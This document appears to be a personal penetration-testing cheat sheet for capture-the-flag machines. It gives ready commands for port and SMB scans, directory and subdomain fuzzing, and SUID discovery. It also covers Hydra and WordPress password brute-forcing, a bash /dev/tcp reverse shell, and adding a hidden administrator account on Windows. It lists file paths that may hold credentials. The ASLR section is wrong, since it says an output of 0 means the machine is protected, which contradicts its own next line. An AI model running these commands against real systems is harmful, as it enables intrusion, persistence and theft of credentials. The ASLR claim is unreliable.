# Pentesting

## Common Scans

### Initial, quick port scan

`nmap -vv -sV -sC -oN initial <ip>`

### Slower, complete port scan

`nmap -vv -sV -sC -p- -A -oN full <ip>`

### SMB

#### Finds SMB Vulnerabilities

`nmap -sC -sV -p<port> <ip> --script=smb-vuln*`

#### Enumerates SMB

`smbclient -L \\\\<ip>\\ -N`

### Directories

#### Gobuster directories scan (using wordlist)
`gobuster dir -e -u <ip> -w <path_to_wordlist>`

#### `ffuf` directory scan (using wordlist)
`ffuf -w <wordlist> -u http://<ip/domain>/FUZZ`

- note that the keyword will be placed in the location of FUZZ

### Subdomains

#### `ffuf` subdomain  scan (using wordlist)
`ffuf -w <wordlist> -u http://<ip/domain>/ -H 'HOST: FUZZ.<ip/domain>'`

eg. `$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt  -u http://permx.htb/ -H 'Host: FUZZ.permx.htb' -mc 200`

## SUID Bit Escalation

`find / -perm -u=s -type f 2>/dev/null`

`getcap -r / 2>/dev/null`

Once you have found different programs and SUID bits to be exploited, you can find default steps to spawn shells and other things at this website: https://gtfobins.github.io/

## Shell Upgrading

Once you have a reverse shell on a machine with python (or python3) available, you can try running these commands to upgrade the shell:

`python -c 'import pty; pty.spawn("/bin/bash")'`

`python3 -c 'import pty; pty.spawn("/bin/bash")'`

## Lateral Movement

### Hijacking a writable script
if the victim runs this, a shell with their privileges is generated. (assuming the attacker is listening at `IP:PORT`)
```bash
bash -i &>/dev/tcp/<IP>/<PORT> 0>&1
```

## Enumerate Writable Folders
`find / -writable 2>/dev/null | cut -d "/" -f 2 | sort -u`

## List current user's sudo permissions
`sudo -l`

## Run a command as a different user with sudo (if permitted)
`sudo -u <user> <command>`

## Hydra Password Brute Force

`hydra -l username -p passwordlist.txt <target>`

## See running crobjobs
`cat /etc/crontab`

## Wordpress Scans

### Enumerates Users

`wpscan --url <ip>/<directory> -e u`

### Brute Forces Passwords

`wpscan --url <ip>/<directory> --passwords <password_list> --username <user>`

## SMB Commands

### List Network Shares

`smbclient -L <ip>`

### Connect To Share

`smbclient \\\\<ip>\\<share_name>`

## BinExp Code Execution

### check for ASLR status
`cat /proc/sys/kernel/randomize_va_space`

- if this outputs `0`, the machine is protected against binary exploits.
- if Address Space Layout Randomization (ASLR) is disabled, then the memory addresses
  of key system data is not randomized.
  - As such, a binary exploit would be able to run arbitrary code.
- resouce: https://www.exploit-db.com/docs/english/17914-bypassing-aslrdep.pdf

- to disable ASLR: `echo 0 | sudo tee /proc/sys/kernel/randomize_va_space`
- src: https://askubuntu.com/questions/318315/how-can-i-temporarily-disable-aslr-address-space-layout-randomization


## NFS Exploit

### 1. Check to see if there are any folders running on the machine that indicate they can be mounted to.
`showmount -e <ip>`

```
Export list for 10.10.60.230:
/srv/nfs *
```
The star indicates that anyone can mount to this folder. If that was not true, there would be a list of IPs that were allowed to mount to it.

### 2. Make a temp directory to mount to the filesystem.
`mkdir /tmp/infosec`

### 3. Mount to that directory and see what is inside, and if you can upload files.
`sudo mount -t nfs <ip>:/<directory> /tmp/infosec`

## Windows

### Get Current User Privileges
`whoami /priv`

### List Users
`net users`

### List User Information
`net user <username>`

### List Listening Ports
`netstat -ano`

### List Other Logged-In Users
`qwinsta`

`query session`

### List User Groups
`net localgroup`

### List Users In Group
`net localgroup <groupname>`

### Get OS Name and Version
`systeminfo | findstr /B /C:"OS Name" /C:"OS Version"`

### List System Updates
`wmic qfe get Caption,Description,HotFixID,InstalledOn`

### Add user to machine and give administrator permissions
`net user <username> <password> /add`

`net localgroup administrators <username> /add`

## Notes
### Directories To Enumerate (Windows)
* `C:\Program Files\FileZilla Server\FileZilla Server.xml`
    - May contain credentials 
* `C:\xampp\FileZilla Server\FileZilla Server.xml`
    - May contain credentials 
